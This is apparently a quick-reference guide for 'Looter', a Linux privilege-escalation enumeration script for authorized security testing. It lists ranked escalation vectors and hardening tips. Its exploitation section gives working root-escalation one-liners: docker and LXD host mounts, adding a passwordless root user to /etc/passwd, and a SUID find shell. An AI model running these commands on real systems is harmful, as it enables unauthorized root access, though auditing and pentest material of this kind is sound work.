# Looter Quick Reference Guide

## 🚀 Quick Start

```bash
# Clone and run (requires authorization!)
git clone https://github.com/supunhg/Looter.git
cd Looter
chmod +x system_scan.sh
sudo ./system_scan.sh
```

## 📋 Output Files

- `system_scan_YYYY-MM-DD_HH-MM-SS.txt` - Complete scan report

## 🎨 Color Coding (Advanced Priority System)

| Color/Format | Meaning | Example |
|--------------|---------|---------|
| **Red Box** | 99% PE Vector | Privileged Docker container |
| **Red Text [!]** | 95% PE Vector | Member of docker group |
| **Yellow Text [*]** | 75% PE Vector | Compilers available |
| **Cyan Text [+]** | Interesting | Configuration files found |

## ⚡ Quick Configuration Presets

### Minimal Scan (Fast)
```bash
SCAN_BASIC_SYSTEM=true
SCAN_NETWORK=true
SCAN_SERVICES=true
# All others = false
```

### Security Audit (Recommended)
```bash
SCAN_PRIVILEGE_ESCALATION=true
SCAN_SECURITY_AUDIT=true
SCAN_SSH_ANALYSIS=true
SCAN_USERS_AUTH=true
CHECK_SUID_SGID=true
CHECK_SUDO_MISCONFIG=true
CHECK_INTERESTING_GROUPS=true
```

### Cloud Instance Analysis
```bash
SCAN_CLOUD_DETECTION=true
SCAN_INTERESTING_FILES=true
SCAN_ENVIRONMENT_ANALYSIS=true
```

### Full Red Team Scan (Slow but Complete)
```bash
# Enable everything
# All SCAN_* = true
# All CHECK_* = true
```

## 🎯 Top 10 Privilege Escalation Vectors

### 99% PE (Critical)
1. **Docker socket in container** - `docker run -v /var/run/docker.sock:/var/run/docker.sock`
2. **Member of docker group** - `groups | grep docker`
3. **Writable /etc/passwd** - `[ -w /etc/passwd ]`
4. **AWS IAM credentials** - Metadata service accessible
5. **NFS no_root_squash** - `/etc/exports`

### 95% PE (High)
6. **NOPASSWD sudo ALL** - `sudo -l`
7. **Readable /etc/shadow** - `[ -r /etc/shadow ]`
8. **Member of lxd group** - Container privilege escalation
9. **Writable systemd service** - Service file modification
10. **pkexec SUID** - CVE-2021-4034 (PwnKit)

## 🔍 Manual Checks After Running Looter

1. **Review all CRITICAL findings** - Address immediately
2. **Check AWS/Azure/GCP metadata** - If cloud detected
3. **Examine writable paths** - Potential hijacking
4. **Review group memberships** - Especially docker, lxd, disk
5. **Check SUID binaries** - Cross-reference with GTFOBins
6. **Analyze bash history** - Credentials or patterns
7. **Verify kernel version** - Check exploit-db
8. **Test sudo privileges** - `sudo -l`
9. **Check capabilities** - `getcap -r / 2>/dev/null`
10. **Review cron jobs** - `/etc/cron*` and user crontabs

## 🛠️ Common Exploitation Techniques

### Docker Group Escalation
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### LXD Group Escalation
```bash
lxc init ubuntu:18.04 ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/bash
```

### Writable /etc/passwd
```bash
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### SUID Binary Exploitation
```bash
# If find has SUID
find . -exec /bin/sh -p \; -quit
```

## 📊 Vulnerability Score Interpretation

| Score | Risk Level | Action Required |
|-------|-----------|-----------------|
| 50+ | CRITICAL | Immediate remediation |
| 30-49 | HIGH | Remediate within 24h |
| 15-29 | ELEVATED | Remediate within 1 week |
| 5-14 | MODERATE | Remediate within 1 month |
| <5 | LOW | Monitor and review |

## 🔐 Top Security Hardening Tips

1. **Disable root SSH login** - `PermitRootLogin no`
2. **Use key-based SSH auth** - `PasswordAuthentication no`
3. **Enable SELinux/AppArmor** - Mandatory access control
4. **Remove unnecessary SUID** - `chmod u-s /path/to/binary`
5. **Restrict sudo access** - Minimal NOPASSWD entries
6. **Enable firewall** - `ufw enable`
7. **Regular updates** - `apt update && apt upgrade`
8. **Audit group memberships** - Remove users from docker/lxd
9. **Secure NFS exports** - Avoid no_root_squash
10. **Monitor logs** - Check auth logs regularly

## 🌐 Network Scanning Tips

### Fast Scan (1 minute)
```bash
NETWORK_SCAN_TIMEOUT=1
NETWORK_SCAN_THREADS=100
```

### Thorough Scan (5+ minutes)
```bash
NETWORK_SCAN_TIMEOUT=2
NETWORK_SCAN_THREADS=50
# Ensure nmap is installed
```

## 📱 Integration with Other Tools

### Export for Further Analysis
```bash
# Extract IPs for nmap
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" system_scan_*.txt | sort -u > ips.txt

# Extract SUID binaries
grep "SUID" system_scan_*.txt > suid_binaries.txt

# Extract vulnerabilities only
grep -E "\[CRITICAL\]|\[HIGH\]" system_scan_*.txt > critical_findings.txt
```

### Feed into Metasploit
```bash
# Use discovered services/versions to search exploits
msfconsole
> search <service_name> <version>
```

## 🆘 Troubleshooting

### Script Hangs
- Disable `SCAN_NETWORK_DISCOVERY=false`
- Reduce `NETWORK_SCAN_THREADS=20`

### Permission Denied Errors
- Run with `sudo`
- Some checks require root privileges

### Too Much Output
- Disable verbose: `OUTPUT_VERBOSE=false`
- Disable specific modules
- Use `grep` to filter results

## 📧 Support & Licensing

**Author:** Supun Hewagamage  
**GitHub:** https://github.com/supunhg  
**License:** Proprietary - Explicit permission required

**For authorized use or licensing inquiries, contact via GitHub.**

---

**Remember: This tool is for authorized security testing only. Unauthorized access is illegal.**
